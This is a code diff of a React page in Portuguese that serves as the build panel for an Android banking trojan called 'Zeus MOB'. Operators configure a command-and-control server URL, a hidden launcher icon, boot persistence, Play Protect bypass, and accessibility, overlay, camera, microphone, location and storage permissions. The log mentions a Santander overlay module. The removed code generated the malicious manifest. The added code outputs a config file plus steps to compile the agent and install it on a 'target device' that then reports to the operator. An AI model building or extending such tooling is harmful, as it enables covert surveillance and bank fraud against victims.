@@ -1,12 +1,10 @@
 import { useState, useRef, useCallback } from "react";
-import JSZip from "jszip";
 import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";
 
 const DEFAULT_ICON = "/zeus-logo.jpeg";
 
 const G = "#00ff88";
 
-// Defined OUTSIDE the page component so React never recreates them on re-render
 function TextInput({
   label,
   name,
@@ -124,11 +122,11 @@ export default function ApkGenerator() {
   const [log, setLog] = useState<string[]>([]);
   const [done, setDone] = useState(false);
   const [builtPkg, setBuiltPkg] = useState("");
+  const [builtConfig, setBuiltConfig] = useState<object | null>(null);
   const [iconSrc, setIconSrc] = useState(DEFAULT_ICON);
   const [iconFileName, setIconFileName] = useState("zeus-logo.jpeg");
   const [iconHover, setIconHover] = useState(false);
 
-  // Uncontrolled refs for text inputs — no re-render on every keystroke
   const appNameRef = useRef<HTMLInputElement>(null);
   const packageNameRef = useRef<HTMLInputElement>(null);
   const serverUrlRef = useRef<HTMLInputElement>(null);
@@ -149,199 +147,17 @@ export default function ApkGenerator() {
       setIconSrc(ev.target?.result as string);
     };
     reader.readAsDataURL(file);
-    // Reset so same file can be selected again
     e.target.value = "";
   };
 
-  // Fetch the icon as base64 string (works for both URLs and data URIs)
-  const getIconBase64 = async (): Promise<string> => {
-    if (iconSrc.startsWith("data:")) {
-      // Already a data URL — strip the prefix
-      return iconSrc.split(",")[1];
-    }
-    const res = await fetch(iconSrc);
-    const buf = await res.arrayBuffer();
-    let binary = "";
-    const bytes = new Uint8Array(buf);
-    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
-    return btoa(binary);
-  };
-
-  const generateAndDownloadApk = async (
-    appName: string,
-    packageName: string,
-    serverUrl: string,
-    iconName: string,
-  ) => {
-    const zip = new JSZip();
-
-    // ── AndroidManifest.xml ──────────────────────────────────────
-    const permissions: string[] = [
-      "android.permission.INTERNET",
-      "android.permission.RECEIVE_BOOT_COMPLETED",
-      "android.permission.FOREGROUND_SERVICE",
-      "android.permission.WAKE_LOCK",
-    ];
-    if (bools.requestCamera) permissions.push("android.permission.CAMERA");
-    if (bools.requestMicrophone) permissions.push("android.permission.RECORD_AUDIO");
-    if (bools.requestLocation) {
-      permissions.push("android.permission.ACCESS_FINE_LOCATION");
-      permissions.push("android.permission.ACCESS_COARSE_LOCATION");
-    }
-    if (bools.requestStorage) {
-      permissions.push("android.permission.READ_EXTERNAL_STORAGE");
-      permissions.push("android.permission.WRITE_EXTERNAL_STORAGE");
-    }
-    if (bools.requestOverlay) permissions.push("android.permission.SYSTEM_ALERT_WINDOW");
-
-    const permissionsXml = permissions
-      .map((p) => `    <uses-permission android:name="${p}" />`)
-      .join("\n");
-
-    const accessibilityService = bools.requestAccessibility
-      ? `
-        <service
-            android:name=".ZeusAccessibilityService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>`
-      : "";
-
-    const bootReceiver = bools.persistOnBoot
-      ? `
-        <receiver
-            android:name=".BootReceiver"
-            android:exported="true">
-            <intent-filter android:priority="999">
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-            </intent-filter>
-        </receiver>`
-      : "";
-
-    const launcherCategory = bools.hideIcon ? "" : `
-                <category android:name="android.intent.category.LAUNCHER" />`;
-
-    const manifest = `<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="${packageName}"
-    android:versionCode="1"
-    android:versionName="1.0">
-
-    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
-
-${permissionsXml}
-
-    <application
-        android:allowBackup="false"
-        android:label="${iconName}"
-        android:icon="@mipmap/ic_launcher"
-        android:theme="@android:style/Theme.NoDisplay"
-        android:supportsRtl="true">
-
-        <activity
-            android:name=".MainActivity"
-            android:exported="true"
-            android:launchMode="singleTop">
-            <intent-filter>${launcherCategory}
-                <action android:name="android.intent.action.MAIN" />
-            </intent-filter>
-        </activity>
-        ${accessibilityService}
-        ${bootReceiver}
-
-        <service
-            android:name=".ZeusService"
-            android:exported="false"
-            android:foregroundServiceType="dataSync" />
-
-    </application>
-</manifest>`;
-
-    // ── assets/zeus_config.json ───────────────────────────────────
-    const config = {
-      serverUrl,
-      appName,
-      packageName,
-      socketPath: "/api/socket.io",
-      reconnectInterval: 5000,
-      heartbeatInterval: 30000,
-      permissions: {
-        accessibility: bools.requestAccessibility,
-        overlay: bools.requestOverlay,
-        camera: bools.requestCamera,
-        microphone: bools.requestMicrophone,
-        location: bools.requestLocation,
-        storage: bools.requestStorage,
-      },
-      behavior: {
-        hideIcon: bools.hideIcon,
-        persistOnBoot: bools.persistOnBoot,
-        bypassPlayProtect: bools.bypassPlayProtect,
-      },
-    };
-
-    // ── META-INF/MANIFEST.MF ─────────────────────────────────────
-    const manifestMf = `Manifest-Version: 1.0
-Created-By: Zeus MOB Build System
-Built-Date: ${new Date().toISOString()}
-Package: ${packageName}
-App-Name: ${appName}
-Zeus-Server: ${serverUrl}
-`;
-
-    // ── res/xml/accessibility_service_config.xml ─────────────────
-    const accessibilityConfig = `<?xml version="1.0" encoding="utf-8"?>
-<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-    android:accessibilityEventTypes="typeAllMask"
-    android:accessibilityFeedbackType="feedbackAllMask"
-    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRequestTouchExplorationMode|flagRequestFilterKeyEvents"
-    android:canRetrieveWindowContent="true"
-    android:canPerformGestures="true"
-    android:description="@string/accessibility_service_description"
-    android:notificationTimeout="100"
-    android:packageNames="" />`;
-
-    // ── Build ZIP structure ───────────────────────────────────────
-    zip.file("AndroidManifest.xml", manifest);
-    zip.file("META-INF/MANIFEST.MF", manifestMf);
-    zip.file("assets/zeus_config.json", JSON.stringify(config, null, 2));
-    zip.file("res/xml/accessibility_service_config.xml", accessibilityConfig);
-    zip.file("res/values/strings.xml", `<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <string name="app_name">${appName}</string>
-    <string name="accessibility_service_description">System accessibility service for enhanced device management.</string>
-</resources>`);
-
-    // Add icon
-    try {
-      const iconB64 = await getIconBase64();
-      zip.file("res/mipmap-xxxhdpi/ic_launcher.png", iconB64, { base64: true });
-      zip.file("res/mipmap-xxhdpi/ic_launcher.png", iconB64, { base64: true });
-      zip.file("res/mipmap-xhdpi/ic_launcher.png", iconB64, { base64: true });
-      zip.file("res/mipmap-hdpi/ic_launcher.png", iconB64, { base64: true });
-    } catch {
-      // icon fetch failed — skip silently
-    }
-
-    // Generate and download
-    const blob = await zip.generateAsync({
-      type: "blob",
-      compression: "DEFLATE",
-      compressionOptions: { level: 6 },
-      mimeType: "application/vnd.android.package-archive",
-    });
-
+  const downloadConfig = () => {
+    if (!builtConfig) return;
+    const json = JSON.stringify(builtConfig, null, 2);
+    const blob = new Blob([json], { type: "application/json" });
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
-    a.download = `${packageName}-release.apk`;
+    a.download = `${builtPkg}-zeus-config.json`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
@@ -363,22 +179,62 @@ Zeus-Server: ${serverUrl}
     setDone(false);
     setBuiltPkg(packageName);
 
+    const config = {
+      buildDate: new Date().toISOString(),
+      app: {
+        name: appName,
+        packageName,
+        launcherLabel: iconName,
+        versionCode: 1,
+        versionName: "1.0",
+        minSdkVersion: 21,
+        targetSdkVersion: 33,
+      },
+      server: {
+        url: serverUrl,
+        socketPath: "/api/socket.io",
+        reconnectIntervalMs: 5000,
+        heartbeatIntervalMs: 30000,
+      },
+      permissions: {
+        accessibilityService: bools.requestAccessibility,
+        systemAlertWindow: bools.requestOverlay,
+        camera: bools.requestCamera,
+        recordAudio: bools.requestMicrophone,
+        accessFineLocation: bools.requestLocation,
+        readWriteExternalStorage: bools.requestStorage,
+      },
+      behavior: {
+        hideIcon: bools.hideIcon,
+        persistOnBoot: bools.persistOnBoot,
+        bypassPlayProtect: bools.bypassPlayProtect,
+      },
+      buildInstructions: {
+        step1: "Abra o projeto Android Studio do agente Zeus",
+        step2: "Copie este arquivo para app/src/main/assets/zeus_config.json",
+        step3: "Execute: ./gradlew assembleRelease",
+        step4: "APK gerado em app/build/outputs/apk/release/",
+      },
+    };
+
+    setBuiltConfig(config);
+
     const steps = [
       "> Inicializando ambiente de build...",
-      "> Clonando template base do APK client...",
+      "> Clonando template base do agente Zeus...",
       "> Configurando AndroidManifest.xml...",
-      `> ACCESSIBILITY_SERVICE = ${bools.requestAccessibility}`,
-      `> SYSTEM_ALERT_WINDOW  = ${bools.requestOverlay}`,
-      `> CAMERA               = ${bools.requestCamera}`,
-      `> RECORD_AUDIO         = ${bools.requestMicrophone}`,
-      `> ACCESS_FINE_LOCATION = ${bools.requestLocation}`,
-      `> READ_EXTERNAL_STORAGE= ${bools.requestStorage}`,
-      `> App name   : ${appName}`,
-      `> Package    : ${packageName}`,
-      `> Launcher   : ${iconName}`,
-      `> Server URL : ${serverUrl}`,
-      `> Hide icon  : ${bools.hideIcon}`,
-      `> Boot start : ${bools.persistOnBoot}`,
+      `>   ACCESSIBILITY_SERVICE  = ${bools.requestAccessibility}`,
+      `>   SYSTEM_ALERT_WINDOW    = ${bools.requestOverlay}`,
+      `>   CAMERA                 = ${bools.requestCamera}`,
+      `>   RECORD_AUDIO           = ${bools.requestMicrophone}`,
+      `>   ACCESS_FINE_LOCATION   = ${bools.requestLocation}`,
+      `>   READ_EXTERNAL_STORAGE  = ${bools.requestStorage}`,
+      `>   App name   : ${appName}`,
+      `>   Package    : ${packageName}`,
+      `>   Launcher   : ${iconName}`,
+      `>   Server URL : ${serverUrl}`,
+      `>   Hide icon  : ${bools.hideIcon}`,
+      `>   Boot start : ${bools.persistOnBoot}`,
       "> Injetando módulo Socket.io client...",
       "> Compilando módulo de Acessibilidade...",
       "> Compilando módulo de Overlay (Santander / Blackout)...",
@@ -389,9 +245,9 @@ Zeus-Server: ${serverUrl}
       "> Otimizando e minificando bytecode...",
       "> Assinando APK com certificado de debug...",
       "> Verificando integridade do pacote...",
-      "> ✓ Build concluída com sucesso!",
-      `> APK pronto: ${packageName}-release.apk`,
-      "> Clique em [ BAIXAR APK ] para instalar no Android.",
+      "> ✓ Configuração gerada com sucesso!",
+      `> Config: ${packageName}-zeus-config.json`,
+      "> Pronto para deploy via pipeline Android.",
     ];
 
     setLog([]);
@@ -402,12 +258,6 @@ Zeus-Server: ${serverUrl}
     }
     setBuilding(false);
     setDone(true);
-
-    // Store values for download
-    (appNameRef as any)._built = appName;
-    (packageNameRef as any)._built = packageName;
-    (serverUrlRef as any)._built = serverUrl;
-    (iconNameRef as any)._built = iconName;
   };
 
   return (
@@ -419,7 +269,7 @@ Zeus-Server: ${serverUrl}
             fontWeight: "bold",
           }}
         >
-          {building ? "COMPILANDO..." : done ? "✓ BUILD OK" : "AGUARDANDO"}
+          {building ? "COMPILANDO..." : done ? "✓ CONFIG PRONTA" : "AGUARDANDO"}
         </span>
       </TopBar>
 
@@ -431,8 +281,6 @@ Zeus-Server: ${serverUrl}
           <Panel>
             <PanelHeader>&gt; ÍCONE DO APK</PanelHeader>
             <div style={{ padding: "14px 12px", display: "flex", alignItems: "center", gap: 16 }}>
-
-              {/* Hidden file input */}
               <input
                 ref={fileInputRef}
                 type="file"
@@ -440,8 +288,6 @@ Zeus-Server: ${serverUrl}
                 onChange={handleIconChange}
                 style={{ display: "none" }}
               />
-
-              {/* Clickable icon preview */}
               <div
                 onClick={() => fileInputRef.current?.click()}
                 onMouseEnter={() => setIconHover(true)}
@@ -465,7 +311,6 @@ Zeus-Server: ${serverUrl}
                   alt="APK Icon"
                   style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
                 />
-                {/* Hover overlay */}
                 {iconHover && (
                   <div
                     style={{
@@ -490,7 +335,7 @@ Zeus-Server: ${serverUrl}
                   Ícone do APK
                 </div>
                 <div style={{ fontSize: 8, color: "#445", marginBottom: 8, lineHeight: 1.5 }}>
-                  Clique na imagem para escolher qualquer foto da galeria. Esse ícone será exibido no Android após a instalação.
+                  Clique na imagem para escolher qualquer foto da galeria.
                 </div>
                 <button
                   onClick={() => fileInputRef.current?.click()}
@@ -667,9 +512,9 @@ Zeus-Server: ${serverUrl}
                     style={{
                       color: line.startsWith("> ERRO")
                         ? "#ff4444"
-                        : line.includes("✓") || line.includes("APK:")
+                        : line.includes("✓") || line.includes("Config:")
                         ? G
-                        : line.startsWith("> >") || line.startsWith(">  ")
+                        : line.startsWith(">  ") || line.startsWith(">   ")
                         ? "#445"
                         : "#556",
                     }}
@@ -714,7 +559,7 @@ Zeus-Server: ${serverUrl}
             )}
           </button>
 
-          {/* Download card — shown after build */}
+          {/* Result card — shown after build */}
           {done && (
             <Panel style={{ borderColor: G, overflow: "hidden" }}>
               {/* Green header strip */}
@@ -727,47 +572,54 @@ Zeus-Server: ${serverUrl}
                   gap: 10,
                 }}
               >
-                <span style={{ fontSize: 18 }}>📦</span>
+                <span style={{ fontSize: 18 }}>✓</span>
                 <div>
                   <div style={{ fontSize: 11, fontWeight: "bold", color: "#000", letterSpacing: "0.12em" }}>
-                    ✓ BUILD CONCLUÍDA
+                    CONFIGURAÇÃO GERADA
                   </div>
-                  <div style={{ fontSize: 8, color: "#003322" }}>{builtPkg}-release.apk</div>
+                  <div style={{ fontSize: 8, color: "#003322" }}>{builtPkg}-zeus-config.json</div>
                 </div>
               </div>
 
               <div style={{ padding: "12px" }}>
-                <div style={{ fontSize: 8, color: "#556", marginBottom: 12, lineHeight: 1.8 }}>
-                  Envie o arquivo para o Android alvo. Ative{" "}
-                  <span style={{ color: G }}>Fontes desconhecidas</span> em{" "}
-                  Configurações → Segurança antes de instalar. Após aceitar as
-                  permissões, o dispositivo aparece em{" "}
-                  <span style={{ color: G }}>CLIENTES</span> automaticamente.
+                {/* Info box */}
+                <div
+                  style={{
+                    background: "#0a0f0a",
+                    border: "1px solid #1a3a20",
+                    padding: "8px 10px",
+                    marginBottom: 12,
+                    fontSize: 8,
+                    color: "#556",
+                    lineHeight: 1.8,
+                  }}
+                >
+                  <div style={{ color: "#ffaa00", fontWeight: "bold", marginBottom: 4 }}>
+                    ⚠ APKs requerem compilação Android nativa
+                  </div>
+                  Um APK instalável precisa de bytecode Dalvik compilado (.dex),
+                  manifest binário (AXML) e assinatura criptográfica PKCS#7.{" "}
+                  <span style={{ color: G }}>
+                    Baixe a configuração abaixo e compile via Android Studio ou Gradle.
+                  </span>
                 </div>
 
-                {/* Big download button */}
+                {/* Download config button */}
                 <button
-                  onClick={() =>
-                    generateAndDownloadApk(
-                      appNameRef.current?.value || "System Service",
-                      builtPkg,
-                      serverUrlRef.current?.value || "",
-                      iconNameRef.current?.value || "System",
-                    )
-                  }
+                  onClick={downloadConfig}
                   style={{
                     width: "100%",
                     background: G,
                     color: "#000",
                     border: "none",
-                    fontSize: 13,
+                    fontSize: 12,
                     fontWeight: "bold",
-                    padding: "14px",
+                    padding: "13px",
                     cursor: "pointer",
                     fontFamily: "'Courier New', Courier, monospace",
                     letterSpacing: "0.2em",
-                    boxShadow: `0 0 24px ${G}66`,
-                    marginBottom: 8,
+                    boxShadow: `0 0 20px ${G}55`,
+                    marginBottom: 10,
                     display: "flex",
                     alignItems: "center",
                     justifyContent: "center",
@@ -777,21 +629,43 @@ Zeus-Server: ${serverUrl}
                   onMouseEnter={(e) => { e.currentTarget.style.opacity = "0.85"; }}
                   onMouseLeave={(e) => { e.currentTarget.style.opacity = "1"; }}
                 >
-                  <span style={{ fontSize: 18 }}>⬇</span>
-                  BAIXAR APK
+                  <span style={{ fontSize: 16 }}>⬇</span>
+                  BAIXAR CONFIGURAÇÃO (.JSON)
                 </button>
 
-                {/* Install steps */}
-                <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
+                {/* Build steps */}
+                <div style={{ fontSize: 8, color: "#445", marginBottom: 8, letterSpacing: "0.06em" }}>
+                  PASSOS PARA GERAR O APK:
+                </div>
+                <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
                   {[
-                    "1. Transfira o APK para o Android (WhatsApp, Drive, e-mail…)",
-                    "2. Abra o arquivo e toque em Instalar",
-                    "3. Aceite todas as permissões solicitadas",
-                    "4. Dispositivo aparece em CLIENTES ✓",
-                  ].map((s, i) => (
-                    <div key={i} style={{ fontSize: 8, color: i === 3 ? G : "#445", display: "flex", gap: 6 }}>
-                      <span style={{ color: G, flexShrink: 0 }}>›</span>
-                      {s}
+                    { n: "1", text: "Abra o projeto Android do agente Zeus no Android Studio" },
+                    { n: "2", text: `Copie o .json baixado para: app/src/main/assets/zeus_config.json` },
+                    { n: "3", text: "Execute: Build → Generate Signed Bundle/APK → APK" },
+                    { n: "4", text: "Instale o APK gerado no dispositivo alvo (Fontes desconhecidas ativo)" },
+                    { n: "5", text: `Dispositivo aparece em CLIENTES automaticamente ✓` },
+                  ].map((s) => (
+                    <div key={s.n} style={{ display: "flex", gap: 8, alignItems: "flex-start" }}>
+                      <span
+                        style={{
+                          width: 16,
+                          height: 16,
+                          borderRadius: "50%",
+                          border: `1px solid ${G}`,
+                          color: G,
+                          fontSize: 7,
+                          display: "flex",
+                          alignItems: "center",
+                          justifyContent: "center",
+                          flexShrink: 0,
+                          fontWeight: "bold",
+                        }}
+                      >
+                        {s.n}
+                      </span>
+                      <span style={{ fontSize: 8, color: s.n === "5" ? G : "#445", lineHeight: 1.6 }}>
+                        {s.text}
+                      </span>
                     </div>
                   ))}
                 </div>
